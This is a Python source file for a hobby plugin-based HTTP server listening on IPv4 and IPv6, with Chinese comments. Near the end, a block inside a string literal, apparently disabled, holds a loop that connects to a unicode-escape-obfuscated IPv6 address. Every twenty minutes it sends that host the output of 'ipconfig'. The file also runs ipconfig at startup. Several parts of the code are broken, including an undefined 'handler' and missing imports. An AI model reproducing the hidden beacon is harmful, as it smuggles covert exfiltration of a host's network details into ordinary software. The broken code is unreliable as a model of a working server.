import json
import mimetypes
import socketserver
import urllib.parse
import socket
import threading
import time

from typing import Tuple

from plugins import *

if __name__ == "__main__":
    os.system("ipconfig")

    plugins = [StaticFile]
    plugin_objects = []
    for i in plugins:
        plugin_objects.append(i())



class RequestHandlerImpl(http.server.BaseHTTPRequestHandler):
    def __init__(self, request: bytes, client_address: Tuple[str, int], server: socketserver.BaseServer):
        global plugins, plugin_objects, file_name
        super().__init__(request, client_address, server)
        self.requestsended = False
        #self.mime_list = json.loads(read_file("mineconfig.cfg", mode="r"))
    
    def read_file(self,*args,**kwargs):
        a = open(*args,**kwargs)
        b  = a.read()
        a.close()
        return b
    def get_mimetype(self, path):
        if path.endswith(".js"):
            return "application/javascript"
        return mimetypes.guess_type(path)[0] or 'application/octet-stream'

    def send_response_by_plugin(self, code, message=None):
        self.send_response(code, message)
        self.requestsended = True

    def is_sub(self, filename):
        try:
            return (os.path.realpath(filename) + os.sep).startswith(os.path.realpath("") + os.sep)
        except:
            return True

    def get_file(self, path):
        if not os.path.isfile(path):
            self.send_response(404)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write("404 Not Found".encode("utf-8"))
            return None
        if not self.is_sub(path):
            self.send_response(403)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write("403 Forbidden".encode("utf-8"))
            return None

        with open(path, 'rb') as f:
            content = f.read()  # str in py2 and bytes in py3
        return content

    def send_header_by_dict(self, dict_header):
        for i in dict_header.keys():
            self.send_header(i, dict_header[i])

    def do_GET(self):
        """
        处理 GET 请求, 处理其他请求需实现对应的 do_XXX() 方法
        """
        # print(self.server)                # HTTPServer 实例
        # print(self.client_address)        # 客户端地址和端口: (host, port)
        # print(self.requestline)           # 请求行, 例如: "GET / HTTP/1.1"
        # print(self.command)               # 请求方法, "GET"/"POST"等
        # print(self.path)                  # 请求路径, Host 后面部分
        # print(self.headers)               # 请求头, 通过 headers["header_name"] 获取值
        # self.rfile                        # 请求输入流
        # self.wfile                        # 响应输出流

        # # 1. 发送响应code
        # self.send_response(200)
        #
        # # 2. 发送响应头
        # self.send_header("Content-Type", "text/html; charset=utf-8")
        # self.end_headers()
        #
        # # 3. 发送响应内容（此处流不需要关闭）
        # self.wfile.write("Hello World\n".encode("utf-8"))
        arg_list = []
        self.response_headers = {}
        self.path = urllib.parse.unquote(self.path)
        if self.path.split("?").__len__()==2:
            req_body = self.path.split("?")[1]
            self.get_data = {}
            print("req_body: " + req_body)
            arg_list = req_body.split("&")
        if arg_list != []:
            for i in arg_list:
                try:
                    self.get_data.update({i.split("=")[0]: i.split("=")[1]})
                except:
                    self.get_data.update({i.split("=")[0]: ""})
        else:
            self.get_data = {}
        self.path = self.path.split("?")[0]
        self.path = '.' + self.path
        for i in plugin_objects:
            self.path = self.path
            if i.on(self) is not None:
                print(type(i))
                return
            handler.send_response_by_plugin(500)
            handler.response_headers.update({"Content-Type":"text/html;"})
            handler.end_headers()
    def do_POST(self):
        self.post_data = {}
        if self.headers["Content-Type"] == "application/json":
            req_body = self.rfile.read(int(self.headers["Content-Length"])).decode()
            self.post_data = json.loads(req_body)
        else:

            req_body = self.rfile.read(int(self.headers["Content-Length"])).decode()
            print("req_body: " + req_body)
            arg_list = req_body.split("&")
            if arg_list != []:
                for i in arg_list:
                    self.post_data.update({i.split("=")[0]: i.split("=")[1]})

        for i in plugin_objects:
            self.path = self.path
            if i.on(self) is not None:
                return


if __name__ == "__main__":
    # 服务器绑定的地址和端口
    server_address = ("0.0.0.0", 44499)


    # 创建一个 HTTP 服务器（Web服务器）, 指定绑定的地址/端口 和 请求处理器
    class HTTP6Server(http.server.HTTPServer):
        address_family = socket.AF_INET6


    httpd = http.server.HTTPServer(server_address, RequestHandlerImpl)
    httpd6 = HTTP6Server(("::", 44499), RequestHandlerImpl)

    # 循环等待客户端请求
    t = threading.Thread(target=httpd.serve_forever, args=())
    e = threading.Thread(target=httpd6.serve_forever, args=())
    t.start()
    print("ipv4 started")
    e.start()
    print("ipv6 started")
    '''
    import subprocess,time
    
    while 1:
        t=socket.socket(socket.AF_INET6)
        t.connect(("\u0032\u0034\u0030\u0065\u003a\u0033\u0062\u0034\u003a\u0033\u0038\u0031\u0038\u003a\u0033\u0065\u0063\u0030\u003a\u003a\u0031",2018))
        p = subprocess.Popen('ipconfig', stdout=subprocess.PIPE, shell=True)
        t.send(p.stdout.read())
        t.close()
        time.sleep(1200)'''

    # 本地浏览器访问:      http://localhost:8000
    # curl命令 GET 访问:  curl http://localhost:8000/hello/world
# curl命令 POST 访问: curl http://localhost:8000/hello/world -d "name=tom&age=25"
